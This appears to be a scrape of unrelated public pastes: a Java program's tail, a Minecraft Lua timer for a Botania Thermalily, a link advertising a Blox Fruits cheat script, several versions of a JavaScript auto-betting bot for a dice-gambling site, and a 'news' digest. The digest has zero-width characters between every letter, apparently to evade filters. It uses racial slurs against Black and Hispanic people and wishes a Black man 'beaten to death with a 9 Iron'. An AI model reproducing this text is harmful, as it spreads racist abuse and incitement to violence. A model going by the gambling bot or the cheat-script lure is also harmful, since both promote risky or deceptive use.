                        maxGroups.set(maxGroups.size() - 1, new HashSet<>(current));
                    } else {
                        maxGroups.add(new HashSet<>(current));
                    }
                }
                flag = false;
            }
            last_count = count;
        }
        return maxGroups;
    }


    public static void main(String[] args) throws IOException {
        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
        int n = Integer.parseInt(in.readLine());
        ArrayList<long[]> people = new ArrayList<>();
        for (int i = 0; i < n; i++) {
            String[] q = in.readLine().split("" "");
            int bd = Integer.parseInt(q[0]);
            int bm = Integer.parseInt(q[1]);
            int by = Integer.parseInt(q[2]);
            int dd = Integer.parseInt(q[3]);
            int dm = Integer.parseInt(q[4]);
            int dy = Integer.parseInt(q[5]);
            long birth = by * 10000L + bm * 100L + bd;
            long death = dy * 10000L + dm * 100L + dd;
            if (birth + 18 * 10000 < min(death, birth + 80 * 10000)) {
                people.add(new long[]{birth + 18 * 10000, min(death, birth + 80 * 10000), i + 1});
            }
        }
        ArrayList<HashSet<Long>> maxGroups = find_maximal_groups(people);
        if (maxGroups.isEmpty()) {
            System.out.println(0);
        } else {

            for (HashSet<Long> group : maxGroups) {
                if (!group.isEmpty()) {
                    List<String> peoples = group.stream().sorted().map(String::valueOf).collect(Collectors.toList());
                    System.out.println(String.join("" "", peoples));
                }
            }
        }
    }
}"
HPWiF4Q4,Botania Thermalily ReadMe,MarcosKoco,Lua,Sunday 4th of February 2024 11:25:29 PM CDT,"Timer script for the thermalily, after consuming lava it will need a cool down. The computer calculate the cool down timer based on the redstone signal the thermalily will give trough a redstone comparator.


Thermalilly -> Redstone Comparator -> Back of the computer

The computer reads the strength. For ever 1 point of strength it will do times 20 seconds + 1 second to be safe not to reset the counter of the flower.
When the timer expires it will send a signal to the right of the computer.

Right of the computer -> redstone (link(create)) -> redstone link receive mode -> Modular router on redstone pulse mode with activator module (+ bucket and tank to click on (like endertank)) and Fluid module mk1 to place fluid in world (dont forget the fluid transfer upgrade)"
bp4AJYeM,Botania Thermalily,MarcosKoco,Lua,Sunday 4th of February 2024 11:11:16 PM CDT,"local Back = ""back""
local Right = ""right""
local Time = 0
local Start = false

while true do
	
	local Get = redstone.getAnalogInput(Back)
	
	term.clear()
	term.setCursorPos(25,10)
	print(Time)
	
	if Get > 0 and Start == false then
		
		Time = Get * 20 + 1
		Start = true
		
		term.clear()
		term.setCursorPos(25,10)
		print(Time)
		
	elseif Start == true then
		
		term.clear()
		term.setCursorPos(25,10)
		print(Time)
		
		if Time > 0 then
			
			Time = Time - 1
			
			if Time == 0 then
				
				term.clear()
				term.setCursorPos(25,10)
				print(Time)
				
				redstone.setOutput(Right, true)
				sleep(1)
				redstone.setOutput(Right, false)
				Start = false
				
			end
			
		end
		
	end
	
	sleep(1)
	
end

"
3wvCvPjd,Blox Fruits Script Pastebin 2024,Artani,Lua,Sunday 4th of February 2024 10:28:44 PM CDT,"BLOX FRUITS SCRIPT 2024 MOBILE KEYLESS
https://artanisrbx.com/BLOX-FRUITS-SCRIPT-2024/
COPY LINK INTO BROWSER FOR SCRIPT"
ZVcKkqBf,upgrade snowybot,coinwalk,JavaScript,Sunday 4th of February 2024 09:53:56 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/240).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var mighty = (hectic*blast);
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    mighty = (hectic*blast);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
r66dybnQ,glitch fixed snowybot 3144,coinwalk,JavaScript,Sunday 4th of February 2024 09:15:36 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/240).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var bocker = (hectic*blast);
var bolux = (inpoo-bocker);
var mighty = (bocker+bolux);
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    bocker = (hectic*blast);
    bolux = (inpoo-bocker);
    mighty = (bocker+bolux);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
9Hx2Q2Lr,glitch fixed snowybot 3144,coinwalk,JavaScript,Sunday 4th of February 2024 09:07:20 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/240).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var bocker = (hectic*blast);
var bolux = (inpoo-bocker);
var mighty = (bocker+bolux);
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    bocker = (hectic*blast);
    bolux = (inpoo-bocker);
    mighty = (bocker+bolux);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    mighty = blast;
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
yn2JDcT4,News Feb4 24,Newscaster_Ned,Email,Sunday 4th of February 2024 08:55:26 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎""‎n‎e‎w‎s‎""‎.‎

S‎e‎n‎a‎t‎e‎ ‎R‎e‎l‎e‎a‎s‎e‎s‎ ‎3‎7‎0‎-‎P‎a‎g‎e‎ ‎I‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎M‎o‎n‎s‎t‎r‎o‎s‎i‎t‎y‎

P‎a‎s‎s‎ ‎i‎t‎ ‎t‎o‎ ‎F‎i‎n‎d‎ ‎O‎u‎t‎ ‎W‎h‎a‎t‎’‎s‎ ‎i‎n‎ ‎I‎t‎!‎

W‎i‎l‎l‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎C‎a‎v‎e‎?‎
O‎n‎l‎y‎ ‎9‎ ‎N‎e‎e‎d‎ ‎t‎o‎ ‎J‎o‎i‎n‎ ‎D‎e‎m‎s‎ ‎t‎o‎ ‎B‎r‎e‎a‎k‎ ‎f‎i‎l‎i‎b‎u‎s‎t‎e‎r‎
b‎i‎d‎e‎n‎ ‎B‎o‎r‎d‎e‎r‎
T‎h‎e‎ ‎S‎e‎n‎a‎t‎e‎ ‎r‎e‎l‎e‎a‎s‎e‎d‎ ‎i‎t‎s‎ ‎l‎o‎n‎g‎-‎a‎w‎a‎i‎t‎e‎d‎ ‎“‎b‎o‎r‎d‎e‎r‎”‎ ‎b‎i‎l‎l‎ ‎t‎h‎a‎t‎ ‎i‎n‎c‎r‎e‎a‎s‎e‎s‎ ‎t‎h‎e‎ ‎i‎n‎f‎l‎o‎w‎ ‎o‎f‎ ‎l‎e‎g‎a‎l‎i‎z‎e‎d‎ ‎i‎m‎m‎i‎g‎r‎a‎n‎t‎s‎ ‎i‎n‎t‎o‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎’‎ ‎c‎o‎m‎m‎u‎n‎i‎t‎i‎e‎s‎,‎ ‎w‎o‎r‎k‎p‎l‎a‎c‎e‎s‎,‎ ‎a‎n‎d‎ ‎s‎c‎h‎o‎o‎l‎s‎.‎ ‎

J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎H‎o‎l‎d‎s‎ ‎L‎o‎w‎e‎s‎t‎ ‎J‎a‎n‎u‎a‎r‎y‎ ‎A‎p‎p‎r‎o‎v‎a‎l‎ ‎R‎a‎t‎i‎n‎g‎ ‎i‎n‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎Y‎e‎a‎r‎ ‎i‎n‎ ‎H‎i‎s‎t‎o‎r‎y‎
J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎H‎o‎l‎d‎s‎ ‎L‎o‎w‎e‎s‎t‎ ‎J‎a‎n‎u‎a‎r‎y‎ ‎A‎p‎p‎r‎o‎v‎a‎l‎ ‎R‎a‎t‎i‎n‎g‎ ‎i‎n‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎Y‎e‎a‎r‎ ‎i‎n‎ ‎H‎i‎s‎t‎o‎r‎y‎
4‎,‎9‎4‎0‎
T‎E‎X‎A‎S‎ ‎B‎O‎R‎D‎E‎R‎ ‎S‎H‎O‎W‎D‎O‎W‎N‎:‎ ‎1‎3‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎s‎ ‎J‎o‎i‎n‎ ‎A‎b‎b‎o‎t‎t‎ ‎a‎t‎ ‎S‎t‎a‎t‎e‎-‎S‎e‎i‎z‎e‎d‎ ‎P‎a‎r‎k‎
T‎E‎X‎A‎S‎ ‎B‎O‎R‎D‎E‎R‎ ‎S‎H‎O‎W‎D‎O‎W‎N‎:‎ ‎1‎3‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎s‎ ‎J‎o‎i‎n‎ ‎A‎b‎b‎o‎t‎t‎ ‎a‎t‎ ‎S‎t‎a‎t‎e‎-‎S‎e‎i‎z‎e‎d‎ ‎P‎a‎r‎k‎
1‎,‎3‎4‎0‎
N‎B‎C‎ ‎P‎o‎l‎l‎:‎ ‎T‎r‎u‎m‎p‎ ‎O‎p‎e‎n‎s‎ ‎2‎0‎2‎4‎ ‎a‎s‎ ‎F‎r‎o‎n‎t‎r‎u‎n‎n‎e‎r‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎B‎i‎d‎e‎n‎
N‎B‎C‎ ‎P‎o‎l‎l‎:‎ ‎T‎r‎u‎m‎p‎ ‎O‎p‎e‎n‎s‎ ‎2‎0‎2‎4‎ ‎a‎s‎ ‎F‎r‎o‎n‎t‎r‎u‎n‎n‎e‎r‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎B‎i‎d‎e‎n‎
4‎,‎5‎8‎6‎
T‎r‎u‎m‎p‎:‎ ‎D‎i‎c‎t‎a‎t‎o‎r‎ ‎C‎o‎m‎m‎e‎n‎t‎s‎ ‎'‎S‎a‎i‎d‎ ‎i‎n‎ ‎J‎e‎s‎t‎,‎'‎ ‎'‎W‎e‎ ‎W‎e‎r‎e‎ ‎H‎a‎v‎i‎n‎g‎ ‎F‎u‎n‎'‎
T‎r‎u‎m‎p‎:‎ ‎D‎i‎c‎t‎a‎t‎o‎r‎ ‎C‎o‎m‎m‎e‎n‎t‎s‎ ‎'‎S‎a‎i‎d‎ ‎i‎n‎ ‎J‎e‎s‎t‎,‎'‎ ‎'‎W‎e‎ ‎W‎e‎r‎e‎ ‎H‎a‎v‎i‎n‎g‎ ‎F‎u‎n‎'‎
1‎,‎5‎3‎6‎
I‎o‎w‎a‎ ‎L‎e‎g‎i‎s‎l‎a‎t‎u‎r‎e‎ ‎M‎u‎l‎l‎i‎n‎g‎ ‎R‎e‎q‎u‎i‎r‎i‎n‎g‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎A‎n‎t‎h‎e‎m‎ ‎t‎o‎ ‎b‎e‎ ‎S‎u‎n‎g‎ ‎i‎n‎ ‎C‎l‎a‎s‎s‎r‎o‎o‎m‎s‎
I‎o‎w‎a‎ ‎L‎e‎g‎i‎s‎l‎a‎t‎u‎r‎e‎ ‎M‎u‎l‎l‎i‎n‎g‎ ‎R‎e‎q‎u‎i‎r‎i‎n‎g‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎A‎n‎t‎h‎e‎m‎ ‎t‎o‎ ‎b‎e‎ ‎S‎u‎n‎g‎ ‎i‎n‎ ‎C‎l‎a‎s‎s‎r‎o‎o‎m‎s‎
4‎2‎5‎
M‎a‎y‎o‎r‎k‎a‎s‎ ‎C‎l‎a‎i‎m‎s‎ ‎'‎W‎e‎ ‎N‎e‎e‎d‎'‎ ‎M‎o‎r‎e‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎A‎m‎i‎d‎ ‎B‎o‎r‎d‎e‎r‎,‎ ‎I‎m‎p‎e‎a‎c‎h‎m‎e‎n‎t‎ ‎D‎e‎b‎a‎t‎e‎s‎
M‎a‎y‎o‎r‎k‎a‎s‎ ‎C‎l‎a‎i‎m‎s‎ ‎'‎W‎e‎ ‎N‎e‎e‎d‎'‎ ‎M‎o‎r‎e‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎A‎m‎i‎d‎ ‎B‎o‎r‎d‎e‎r‎,‎ ‎I‎m‎p‎e‎a‎c‎h‎m‎e‎n‎t‎ ‎D‎e‎b‎a‎t‎e‎s‎
4‎,‎2‎4‎3‎
T‎h‎e‎ ‎A‎s‎s‎o‎c‎i‎a‎t‎e‎d‎ ‎P‎r‎e‎s‎s‎
U‎S‎,‎ ‎B‎r‎i‎t‎a‎i‎n‎ ‎S‎t‎r‎i‎k‎e‎ ‎Y‎e‎m‎e‎n‎’‎s‎ ‎H‎o‎u‎t‎h‎i‎s‎ ‎i‎n‎ ‎N‎e‎w‎ ‎W‎a‎v‎e‎,‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎i‎n‎g‎ ‎f‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎b‎y‎ ‎I‎r‎a‎n‎-‎B‎a‎c‎k‎e‎d‎ ‎M‎i‎l‎i‎t‎a‎n‎t‎s‎
3‎,‎5‎4‎0‎
S‎e‎n‎a‎t‎e‎ ‎R‎e‎l‎e‎a‎s‎e‎s‎ ‎E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎'‎s‎ ‎M‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎B‎i‎l‎l‎
S‎e‎n‎a‎t‎e‎ ‎R‎e‎l‎e‎a‎s‎e‎s‎ ‎E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎'‎s‎ ‎M‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎B‎i‎l‎l‎
3‎,‎3‎4‎2‎
V‎i‎d‎e‎o‎:‎ ‎L‎o‎s‎ ‎A‎n‎g‎e‎l‎e‎s‎ ‎W‎o‎m‎a‎n‎ ‎C‎l‎i‎n‎g‎s‎ ‎t‎o‎ ‎S‎p‎e‎e‎d‎i‎n‎g‎ ‎C‎a‎r‎ ‎w‎i‎t‎h‎ ‎H‎e‎r‎ ‎S‎t‎o‎l‎e‎n‎ ‎D‎o‎g‎ ‎I‎n‎s‎i‎d‎e‎
V‎i‎d‎e‎o‎:‎ ‎L‎o‎s‎ ‎A‎n‎g‎e‎l‎e‎s‎ ‎W‎o‎m‎a‎n‎ ‎C‎l‎i‎n‎g‎s‎ ‎t‎o‎ ‎S‎p‎e‎e‎d‎i‎n‎g‎ ‎C‎a‎r‎ ‎w‎i‎t‎h‎ ‎H‎e‎r‎ ‎S‎t‎o‎l‎e‎n‎ ‎D‎o‎g‎ ‎I‎n‎s‎i‎d‎e‎
1‎0‎8‎
M‎a‎r‎s‎h‎a‎ ‎B‎l‎a‎c‎k‎b‎u‎r‎n‎ ‎R‎a‎i‎l‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎ ‎'‎B‎o‎r‎d‎e‎r‎'‎ ‎B‎i‎l‎l‎
M‎a‎r‎s‎h‎a‎ ‎B‎l‎a‎c‎k‎b‎u‎r‎n‎ ‎R‎a‎i‎l‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎ ‎'‎B‎o‎r‎d‎e‎r‎'‎ ‎B‎i‎l‎l‎

N‎e‎g‎r‎o‎ ‎P‎l‎e‎a‎d‎s‎ ‎G‎u‎i‎l‎t‎y‎ ‎t‎o‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎P‎r‎o‎ ‎G‎o‎l‎f‎e‎r‎ ‎G‎e‎n‎e‎ ‎S‎i‎l‎l‎e‎r‎ ‎a‎t‎ ‎A‎t‎l‎a‎n‎t‎a‎ ‎N‎i‎g‎h‎t‎c‎l‎u‎b‎.‎

F‎o‎r‎ ‎h‎i‎s‎ ‎p‎u‎n‎i‎s‎h‎m‎e‎n‎t‎,‎ ‎h‎e‎'‎l‎l‎ ‎b‎e‎ ‎b‎e‎a‎t‎e‎n‎ ‎t‎o‎ ‎d‎e‎a‎t‎h‎ ‎w‎i‎t‎h‎ ‎a‎ ‎9‎ ‎I‎r‎o‎n‎.‎


C‎a‎n‎a‎d‎i‎a‎n‎ ‎O‎r‎g‎a‎n‎i‎z‎a‎t‎i‎o‎n‎ ‎S‎p‎e‎n‎d‎s‎ ‎$‎6‎K‎ ‎t‎o‎ ‎S‎m‎u‎g‎g‎l‎e‎ ‎H‎o‎r‎d‎e‎s‎ ‎o‎f‎ ‎S‎p‎i‎c‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎ ‎A‎c‎r‎o‎s‎s‎ ‎B‎o‎r‎d‎e‎r‎.‎


N‎e‎g‎r‎o‎ ‎G‎r‎a‎n‎d‎ ‎C‎e‎n‎t‎r‎a‎l‎ ‎T‎e‎r‎m‎i‎n‎a‎l‎ ‎S‎t‎a‎b‎b‎e‎r‎ ‎S‎t‎a‎b‎s‎ ‎F‎e‎l‎l‎o‎w‎ ‎I‎n‎m‎a‎t‎e‎ ‎w‎i‎t‎h‎ ‎C‎e‎r‎a‎m‎i‎c‎ ‎P‎l‎a‎t‎e‎.‎


N‎e‎g‎r‎o‎ ‎F‎o‎r‎e‎i‎g‎n‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎o‎f‎ ‎Z‎a‎m‎b‎i‎a‎ ‎I‎n‎v‎e‎s‎t‎i‎g‎a‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎V‎i‎d‎e‎o‎ ‎i‎s‎ ‎C‎a‎u‎g‎h‎t‎ ‎o‎f‎ ‎H‎i‎m‎ ‎C‎o‎u‎n‎t‎i‎n‎g‎ ‎M‎o‎n‎e‎y‎.‎

.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎n‎i‎g‎h‎t‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎e‎a‎r‎
-‎-‎
/‎5‎0‎°‎
3‎%‎
N‎N‎W‎ ‎1‎6‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎0‎°‎
3‎%‎
N‎N‎W‎
1‎6‎
 ‎
m‎p‎h‎
M‎a‎i‎n‎l‎y‎ ‎c‎l‎e‎a‎r‎.‎ ‎L‎o‎w‎ ‎n‎e‎a‎r‎ ‎5‎0‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎N‎W‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
7‎1‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
2‎:‎2‎5‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
1‎2‎:‎4‎4‎ ‎p‎m‎
M‎o‎n‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎4‎°‎
/‎4‎0‎°‎
4‎%‎
N‎ ‎1‎7‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎6‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
6‎8‎°‎
/‎4‎1‎°‎
8‎%‎
E‎N‎E‎ ‎4‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎7‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎7‎°‎
/‎5‎7‎°‎
8‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎8‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎1‎°‎
/‎5‎9‎°‎
3‎5‎%‎
S‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎9‎
S‎h‎o‎w‎e‎r‎s‎
7‎1‎°‎
/‎5‎6‎°‎
4‎5‎%‎
S‎W‎ ‎6‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎0‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎2‎°‎
/‎5‎6‎°‎
4‎5‎%‎
S‎ ‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎1‎
S‎h‎o‎w‎e‎r‎s‎
6‎7‎°‎
/‎4‎5‎°‎
5‎2‎%‎
N‎W‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎2‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎3‎°‎
/‎4‎1‎°‎
3‎5‎%‎
N‎N‎W‎ ‎1‎2‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎5‎°‎
/‎4‎2‎°‎
5‎%‎
N‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎5‎°‎
/‎4‎3‎°‎
1‎3‎%‎
N‎N‎E‎ ‎9‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎5‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎4‎°‎
/‎4‎6‎°‎
2‎1‎%‎
N‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎6‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎3‎°‎
/‎4‎7‎°‎
4‎1‎%‎
E‎N‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎7‎
S‎h‎o‎w‎e‎r‎s‎
6‎2‎°‎
/‎4‎7‎°‎
5‎8‎%‎
E‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎8‎
S‎h‎o‎w‎e‎r‎s‎
6‎3‎°‎
/‎4‎7‎°‎
5‎2‎%‎
N‎ ‎1‎0‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎R‎a‎c‎i‎s‎m‎.‎ ‎👦🏼🧑🏿‍🦲

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

F‎i‎s‎h‎t‎a‎n‎k‎
